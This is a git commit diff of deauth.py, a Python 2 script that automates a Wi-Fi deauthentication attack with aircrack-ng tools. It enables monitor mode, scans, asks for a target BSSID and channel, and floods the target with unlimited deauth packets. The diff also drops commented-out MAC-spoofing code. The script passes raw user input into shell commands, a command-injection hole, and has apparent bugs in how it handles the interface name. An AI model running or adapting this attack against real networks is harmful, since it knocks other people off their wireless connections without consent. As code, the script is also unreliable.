18d98e89338fa9149a2724205640e3081f7e5c6b
root <root@localhost.localdomain>
2019-04-17 11:54:25 +0000

    phase 3

--- deauth.py
+++ deauth.py
@@ -1,50 +1,31 @@
-""":"
-exec python $0 ${1+"$@"}
-"""
-
-
 import subprocess, time, os
 
 print subprocess.call("airmon-ng")
-print '\n>>>Select your wireless interface<<<'
-interface = raw_input(">>>Interface: ")
-print '\n[+] Interface set to {0}!'.format(interface)
+print '\n Select your wireless interface to continue ... '
+interface = raw_input("Interface: ")
+print '\n The Interface set to {0}!'.format(interface)
 time.sleep(1)
+interface = interface+'mon'
 
 class script:
-
-    '''def anon(self):
-        print '>>>Randomizing MAC-Address for {0}'.format(interface)   
-        os.system('ifconfig ' + interface + ' down')
-        os.system('macchanger -r ' + interface)
-        os.system('ifconfig ' + interface + ' up')
-        print '\n[+] MAC-Address randomized!'
-        time.sleep(2)'''
-
     def attack(self):       
-        print '>>>Enabling monitor mode on {0}'.format(interface)
-	os.system("ifconfig "+ interface + "down")
+	os.system("ifconfig "+ interface + " down")
         os.system("airmon-ng start " + interface)
 	os.system("airmon-ng check kill")
-        #print '[+] monitor mode enabled for {0}'.format(interface)
-        #print '>>>Spoofing mon0...'
-        time.sleep(2)
-        #commands_a = ['ifconfig mon0 down','macchanger -r mon0','ifconfig mon0 up']
-        #for commands in commands_a:
-        #    os.system(commands)
-        #print '[+] mon0 has been successfully spoofed!'
+	interface = interface+'mon'
+	print 'Monitor mode Enabled !'
+        time.sleep(1)
         print '>>>Scanning...'
         os.system("xterm -hold -e 'airodump-ng wlan0mon' & disown")
-        bssid_a = raw_input(">>>Select bssid of your target: ")
-        #os.system("xterm -hold -e 'macchanger -s mon0' & disown")
-        #bssid_h = raw_input(">>>Select your bssid (mon0): ")
-        print '\n[+] Starting wireless assault on {0}!'.format(bssid_a)
-        #time.sleep(2)
-        os.system('aireplay-ng --deauth 0 -a ' + bssid_a + ' wlan0mon')
+        bssid = raw_input("Select bssid of your target: ")
+	channel = raw_input("Select channel of your target: ")
+	os.system("xterm -hold -e '"+"airodump-ng wlan0mon --bssid "+bssid+" --channel "+channel+"' & disown" )
+        print '\nStarting wireless assault on {0}!'.format(bssid)
+       	time.sleep(1)
+        os.system('aireplay-ng --deauth 0 -a ' + bssid + ' wlan0mon')
     
     def main(self):
         main = script()
-        #main.anon()
         main.attack()
 
 if __name__ == '__main__':
